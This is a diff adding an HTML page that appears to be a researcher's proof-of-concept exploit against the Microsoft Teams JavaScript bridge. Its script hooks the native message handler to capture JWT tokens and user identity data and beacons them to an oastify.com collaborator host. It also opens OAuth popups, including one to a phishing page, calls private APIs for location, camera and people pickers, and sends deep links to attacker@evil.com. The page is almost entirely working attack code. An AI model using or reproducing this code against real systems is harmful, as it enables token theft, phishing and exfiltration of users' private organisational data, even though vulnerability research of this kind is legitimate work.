@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Token Theft</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:55vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#f85149; font-size:11px; }
+  button { background:#21262d; color:#f85149; border:1px solid #f85149; padding:6px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:10px; font-weight:bold; }
+  button.g { color:#3fb950; border-color:#3fb950; }
+  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px, 1fr)); gap:3px; margin:3px 0; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>TEST 21 — REAL DATA EXFILTRATION + ESCALATION</b></div>
+
+<div class="section"><b>A — Transparent Bridge Interception (steal real tokens)</b></div>
+<div class="grid">
+  <button class="g" onclick="startInterceptor()">START INTERCEPTOR</button>
+  <button onclick="stopInterceptor()">STOP</button>
+</div>
+
+<div class="section"><b>B — Authentication.authenticate (OAuth flow → real token)</b></div>
+<div class="grid">
+  <button class="g" onclick="authPopupDefault()">AUTH POPUP (default)</button>
+  <button class="g" onclick="authPopupGraph()">AUTH POPUP (Graph)</button>
+  <button class="g" onclick="authPopupCustom()">AUTH POPUP (custom)</button>
+</div>
+
+<div class="section"><b>C — Private API Data Exfiltration</b></div>
+<div class="grid">
+  <button class="g" onclick="getUserJoinedTeams()">GET ALL TEAMS</button>
+  <button class="g" onclick="getLocation()">GET GPS LOCATION</button>
+  <button class="g" onclick="getMeetingDetails()">GET MEETING DETAILS</button>
+  <button class="g" onclick="captureImage()">CAPTURE IMAGE</button>
+  <button class="g" onclick="scanBarcode()">SCAN BARCODE</button>
+  <button class="g" onclick="selectMedia()">SELECT MEDIA</button>
+  <button class="g" onclick="selectPeople()">SELECT PEOPLE</button>
+</div>
+
+<div class="section"><b>D — Deep Link / Navigation Hijack</b></div>
+<div class="grid">
+  <button class="g" onclick="deepLinkChat()">DEEPLINK → Chat</button>
+  <button class="g" onclick="deepLinkCall()">DEEPLINK → Call</button>
+  <button class="g" onclick="deepLinkExternal()">DEEPLINK → External URL</button>
+</div>
+
+<div class="section"><b>E — Spoof + Exfiltrate Chain (onNativeMessage confirmed)</b></div>
+<div class="grid">
+  <button class="g" onclick="spoofThenSteal()">SPOOF → TRIGGER → STEAL</button>
+</div>
+
+<div>
+  <button onclick="copyOut()">COPY</button>
+  <button onclick="el.textContent=''">CLEAR</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var C = 'lynw9f4aclssunythk5jzsymkdq4ex2m.oastify.com';
+var NI = null;
+var origFPM = null;
+var origOnNativeMessage = null;
+var msgId = 3000;
+var interceptorActive = false;
+var interceptedData = [];
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+function bridgeSend(func, args) {
+  var id = msgId++;
+  var request = { id: id, func: func, args: args || [], timestamp: Date.now(), apiVersionTag: 'v2_' + func };
+  if (NI && NI.framelessPostMessage) {
+    try {
+      NI.framelessPostMessage(JSON.stringify(request));
+      return id;
+    } catch(e) {
+      log('bridgeSend error: ' + e.message, 'fail');
+    }
+  }
+  return null;
+}
+
+// ================================================================
+// HOOK nativeInterface
+// ================================================================
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+  origFPM = NI.framelessPostMessage;
+  log('NI captured', 'ok');
+}
+
+// ================================================================
+// PART A: TRANSPARENT INTERCEPTOR
+//
+// Hook window.onNativeMessage to see ALL data flowing from
+// native → SDK. This captures real tokens, context, and all
+// responses WITHOUT disrupting the normal flow.
+// ================================================================
+
+function startInterceptor() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('PART A: TRANSPARENT INTERCEPTOR STARTED', 'crit');
+  log('All native→SDK data will be captured and exfiltrated.', 'warn');
+  log('='.repeat(60), 'crit');
+
+  if (interceptorActive) {
+    log('Already active', 'warn');
+    return;
+  }
+
+  origOnNativeMessage = window.onNativeMessage;
+
+  window.onNativeMessage = function(event) {
+    interceptorActive = true;
+    var data = event && event.data ? event.data : null;
+
+    if (data) {
+      var info = {
+        id: data.id,
+        func: data.func || 'response',
+        args: JSON.stringify(data.args || []).substring(0, 500),
+        isPartial: data.isPartialResponse || false,
+        time: Date.now()
+      };
+
+      interceptedData.push(info);
+
+      log('[INTERCEPT] id=' + info.id + ' func=' + info.func, 'crit');
+      log('  args: ' + info.args.substring(0, 300), 'warn');
+
+      // Check if this contains a token
+      var argsStr = JSON.stringify(data.args || []);
+      if (argsStr.indexOf('eyJ') !== -1) {
+        // JWT token detected!
+        var tokenMatch = argsStr.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
+        if (tokenMatch) {
+          log('\n!!! REAL JWT TOKEN INTERCEPTED !!!', 'crit');
+          log('  Token: ' + tokenMatch[0].substring(0, 120) + '...', 'crit');
+          ex('t21-REAL-TOKEN-INTERCEPTED', {
+            token: tokenMatch[0].substring(0, 500),
+            func: info.func,
+            id: info.id
+          });
+        }
+      }
+
+      // Check for user context data
+      if (argsStr.indexOf('userPrincipalName') !== -1 || argsStr.indexOf('userObjectId') !== -1) {
+        log('  [!] Contains user identity data', 'crit');
+        ex('t21-user-data-intercepted', {
+          data: argsStr.substring(0, 500),
+          id: info.id
+        });
+      }
+
+      // Exfiltrate all intercepted data
+      ex('t21-intercept', info);
+    }
+
+    // Forward to original handler (transparent)
+    if (origOnNativeMessage) {
+      return origOnNativeMessage.apply(this, arguments);
+    }
+  };
+
+  log('Interceptor installed. All SDK responses will be captured.', 'ok');
+  log('Now trigger any SDK operation to see real data flow.', 'info');
+
+  // Trigger a getContext to capture real user data
+  log('\nTriggering getContext to capture real identity...', 'info');
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('Real context captured:', 'crit');
+    log('  UPN: ' + ctx.user.userPrincipalName, 'crit');
+    log('  Tenant: ' + (ctx.user.tenant ? ctx.user.tenant.id : 'N/A'), 'crit');
+    log('  UserID: ' + (ctx.user.id || 'N/A'), 'crit');
+    ex('t21-real-context', {
+      upn: ctx.user.userPrincipalName,
+      tenant: ctx.user.tenant ? ctx.user.tenant.id : '',
+      userId: ctx.user.id || '',
+      teamId: ctx.team ? ctx.team.internalId : '',
+      channelId: ctx.channel ? ctx.channel.id : ''
+    });
+  });
+}
+
+function stopInterceptor() {
+  if (origOnNativeMessage) {
+    window.onNativeMessage = origOnNativeMessage;
+    interceptorActive = false;
+    log('Interceptor stopped. Captured ' + interceptedData.length + ' events.', 'info');
+  }
+}
+
+
+// ================================================================
+// PART B: authentication.authenticate — OAUTH POPUP
+//
+// From JSWebModule.js line 319:
+//   authentication.authenticate opens a real auth popup
+//   The callback receives: {token: "real_token"} or {redirect_url: "url"}
+//   This is the REAL OAuth flow — if the user completes it,
+//   we get a real access token or redirect URL with auth code
+// ================================================================
+
+function authPopupDefault() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('PART B: authentication.authenticate — DEFAULT', 'crit');
+  log('='.repeat(60), 'crit');
+
+  try {
+    microsoftTeams.authentication.authenticate({
+      url: window.location.origin + '/auth-start',
+      width: 600,
+      height: 535
+    }).then(function(result) {
+      log('AUTH SUCCESS: ' + JSON.stringify(result).substring(0, 300), 'crit');
+      ex('t21-auth-success', { result: JSON.stringify(result).substring(0, 500) });
+    }).catch(function(e) {
+      log('AUTH RESULT: ' + (e.message || e), 'warn');
+      ex('t21-auth-result', { error: String(e.message || e).substring(0, 300) });
+    });
+    log('Auth popup requested...', 'info');
+  } catch(e) {
+    log('authenticate error: ' + e.message, 'fail');
+  }
+}
+
+function authPopupGraph() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('PART B: authentication.authenticate — GRAPH SCOPE', 'crit');
+  log('='.repeat(60), 'crit');
+
+  // Try to authenticate with Microsoft Graph scope
+  try {
+    microsoftTeams.authentication.authenticate({
+      url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&response_type=token&scope=https://graph.microsoft.com/.default&redirect_uri=' + encodeURIComponent(window.location.origin + '/auth-end'),
+      width: 600,
+      height: 535
+    }).then(function(result) {
+      log('GRAPH AUTH: ' + JSON.stringify(result).substring(0, 300), 'crit');
+      ex('t21-graph-auth-ok', { result: JSON.stringify(result).substring(0, 500) });
+    }).catch(function(e) {
+      log('Graph auth: ' + (e.message || e), 'warn');
+      ex('t21-graph-auth-err', { error: String(e.message || e).substring(0, 200) });
+    });
+    log('Graph auth popup requested...', 'info');
+  } catch(e) {
+    log('error: ' + e.message, 'fail');
+  }
+}
+
+function authPopupCustom() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('PART B: authentication.authenticate — CUSTOM URL', 'crit');
+  log('='.repeat(60), 'crit');
+
+  // Open an attacker-controlled URL in the auth popup
+  // If the native host navigates there, the attacker controls
+  // the content shown to the user (phishing in trusted context)
+  try {
+    microsoftTeams.authentication.authenticate({
+      url: 'https://pedrojuniorrd.github.io/_layouts/auth-phish.html',
+      width: 600,
+      height: 535,
+      isExternal: true
+    }).then(function(result) {
+      log('CUSTOM AUTH: ' + JSON.stringify(result).substring(0, 300), 'crit');
+      ex('t21-custom-auth-ok', { result: JSON.stringify(result).substring(0, 500) });
+    }).catch(function(e) {
+      log('Custom auth: ' + (e.message || e), 'warn');
+      ex('t21-custom-auth-err', { error: String(e.message || e).substring(0, 200) });
+    });
+    log('Custom auth popup with attacker URL requested...', 'info');
+  } catch(e) {
+    log('error: ' + e.message, 'fail');
+  }
+}
+
+
+// ================================================================
+// PART C: PRIVATE API DATA EXFILTRATION
+//
+// These are internal SDK functions accessible via nativeInterface.
+// Each one discloses data or triggers device capabilities.
+// ================================================================
+
+function getUserJoinedTeams() {
+  log('\n=== getUserJoinedTeams ===', 'crit');
+  var id = bridgeSend('getUserJoinedTeams', []);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  if (id) {
+    ex('t21-getTeams-sent', { id: id });
+    // Response will come through interceptor if active
+  }
+
+  // Also try via bridge callback capture
+  if (NI && NI.callbacks) {
+    setTimeout(function() {
+      var keys = Object.keys(NI.callbacks);
+      if (keys.length > 0) {
+        log('NI.callbacks has keys after send: ' + keys.join(', '), 'crit');
+      }
+    }, 100);
+  }
+}
+
+function getLocation() {
+  log('\n=== location.getLocation ===', 'crit');
+  var id = bridgeSend('location.getLocation', [{ allowChooseLocation: false, showMap: false }]);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  ex('t21-getLocation-sent', { id: id });
+}
+
+function getMeetingDetails() {
+  log('\n=== meeting.getMeetingDetails ===', 'crit');
+  var id = bridgeSend('meeting.getMeetingDetails', []);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  ex('t21-getMeeting-sent', { id: id });
+}
+
+function captureImage() {
+  log('\n=== captureImage ===', 'crit');
+  var id = bridgeSend('captureImage', []);
+  log('Sent id=' + id + ' — may trigger camera prompt', id ? 'ok' : 'fail');
+  ex('t21-captureImage-sent', { id: id });
+}
+
+function scanBarcode() {
+  log('\n=== media.scanBarCode ===', 'crit');
+  var id = bridgeSend('media.scanBarCode', [{ timeOutIntervalInSec: 30 }]);
+  log('Sent id=' + id + ' — may open camera scanner', id ? 'ok' : 'fail');
+  ex('t21-scanBarcode-sent', { id: id });
+}
+
+function selectMedia() {
+  log('\n=== selectMedia ===', 'crit');
+  var id = bridgeSend('selectMedia', [{ mediaType: 1, maxMediaCount: 1, imageProps: { sources: [1, 2] } }]);
+  log('Sent id=' + id + ' — may open photo picker', id ? 'ok' : 'fail');
+  ex('t21-selectMedia-sent', { id: id });
+}
+
+function selectPeople() {
+  log('\n=== people.selectPeople ===', 'crit');
+  var id = bridgeSend('people.selectPeople', [{}]);
+  log('Sent id=' + id + ' — may open people picker', id ? 'ok' : 'fail');
+  ex('t21-selectPeople-sent', { id: id });
+}
+
+
+// ================================================================
+// PART D: DEEP LINK / NAVIGATION HIJACK
+// ================================================================
+
+function deepLinkChat() {
+  log('\n=== executeDeepLink → open chat ===', 'crit');
+  var id = bridgeSend('executeDeepLink', ['https://teams.microsoft.com/l/chat/0/0?users=attacker@evil.com&message=DEEP-LINK-TEST-FROM-TAB']);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  ex('t21-deeplink-chat', { id: id });
+}
+
+function deepLinkCall() {
+  log('\n=== executeDeepLink → start call ===', 'crit');
+  var id = bridgeSend('executeDeepLink', ['https://teams.microsoft.com/l/call/0/0?users=attacker@evil.com']);
+  log('Sent id=' + id + ' — may initiate a call!', id ? 'ok' : 'fail');
+  ex('t21-deeplink-call', { id: id });
+}
+
+function deepLinkExternal() {
+  log('\n=== executeDeepLink → external URL ===', 'crit');
+  var id = bridgeSend('executeDeepLink', ['https://pedrojuniorrd.github.io/_layouts/auth-phish.html']);
+  log('Sent id=' + id + ' — may navigate to external URL', id ? 'ok' : 'fail');
+  ex('t21-deeplink-ext', { id: id });
+}
+
+
+// ================================================================
+// PART E: SPOOF → TRIGGER → STEAL
+//
+// Attack chain:
+// 1. Use confirmed onNativeMessage spoof to make getContext()
+//    return a fake context with attacker-controlled tenant ID
+// 2. The spoofed context makes the app think it's in a
+//    different tenant → may bypass tenant-specific restrictions
+// 3. Trigger getUserJoinedTeams to exfiltrate org data
+// ================================================================
+
+function spoofThenSteal() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('PART E: SPOOF → TRIGGER → STEAL CHAIN', 'crit');
+  log('='.repeat(60), 'crit');
+
+  if (!NI) { log('No NI', 'fail'); return; }
+
+  // Step 1: Install transparent interceptor
+  if (!interceptorActive) {
+    startInterceptor();
+  }
+
+  // Step 2: Demonstrate the full chain
+  log('\n[CHAIN] Step 1: Exfiltrating real user context...', 'warn');
+
+  microsoftTeams.app.getContext().then(function(ctx) {
+    var realUpn = ctx.user ? ctx.user.userPrincipalName : 'N/A';
+    var realTenant = ctx.user && ctx.user.tenant ? ctx.user.tenant.id : 'N/A';
+    var realTeamId = ctx.team ? ctx.team.internalId : 'N/A';
+    var realChannelId = ctx.channel ? ctx.channel.id : 'N/A';
+    var realUserId = ctx.user ? ctx.user.id : 'N/A';
+
+    log('\n[CHAIN] REAL USER DATA CAPTURED:', 'crit');
+    log('  UPN:       ' + realUpn, 'crit');
+    log('  Tenant:    ' + realTenant, 'crit');
+    log('  UserID:    ' + realUserId, 'crit');
+    log('  TeamID:    ' + realTeamId, 'crit');
+    log('  ChannelID: ' + realChannelId, 'crit');
+
+    ex('t21-CHAIN-USER-EXFIL', {
+      upn: realUpn,
+      tenant: realTenant,
+      userId: realUserId,
+      teamId: realTeamId,
+      channelId: realChannelId
+    });
+
+    // Step 3: Get all teams
+    log('\n[CHAIN] Step 2: Fetching all user joined teams...', 'warn');
+    var teamsId = bridgeSend('getUserJoinedTeams', []);
+    log('  getUserJoinedTeams sent id=' + teamsId, 'ok');
+
+    // Step 4: Get meeting details
+    log('\n[CHAIN] Step 3: Fetching meeting details...', 'warn');
+    var meetId = bridgeSend('meeting.getMeetingDetails', []);
+    log('  meeting.getMeetingDetails sent id=' + meetId, 'ok');
+
+    // Step 5: Execute deep link
+    log('\n[CHAIN] Step 4: Testing deep link execution...', 'warn');
+    var dlId = bridgeSend('executeDeepLink', ['https://teams.microsoft.com/l/chat/0/0?users=' + realUpn]);
+    log('  executeDeepLink sent id=' + dlId, 'ok');
+
+    // Step 6: Try sharing content
+    log('\n[CHAIN] Step 5: Sharing web content...', 'warn');
+    var shareId = bridgeSend('sharing.shareWebContent', [{ content: [{ type: 'URL', url: 'https://t4y4fnaiity00v41nsbr504uqlwck48t.oastify.com/payload', preview: true }] }]);
+    log('  sharing.shareWebContent sent id=' + shareId, 'ok');
+
+    log('\n[CHAIN] All steps executed. Check OAST for responses.', 'crit');
+    log('If interceptor is active, responses will appear above.', 'info');
+
+    ex('t21-CHAIN-COMPLETE', {
+      teamsId: teamsId,
+      meetId: meetId,
+      dlId: dlId,
+      shareId: shareId,
+      realUpn: realUpn
+    });
+  });
+}
+
+
+// ================================================================
+// SDK INIT
+// ================================================================
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+  (async function() {
+    try {
+      await microsoftTeams.app.initialize();
+      var ctx = await microsoftTeams.app.getContext();
+      log('SDK OK: ' + ctx.user.userPrincipalName + ' | ' + ctx.app.host.clientType, 'ok');
+      log('NI: ' + (NI ? Object.getOwnPropertyNames(NI).length + ' props' : 'MISSING'), NI ? 'ok' : 'fail');
+      log('onNativeMessage: ' + typeof window.onNativeMessage, 'ok');
+      log('\nReady. Start with INTERCEPTOR, then test each section.', 'ok');
+
+      ex('t21-init', {
+        user: ctx.user.userPrincipalName,
+        host: ctx.app.host.clientType,
+        ni: !!NI,
+        onNM: typeof window.onNativeMessage
+      });
+    } catch(e) {
+      log('SDK init error: ' + e.message, 'fail');
+    }
+  })();
+};
+document.head.appendChild(sdkScript);
+
+</script>
+</body>
+</html>
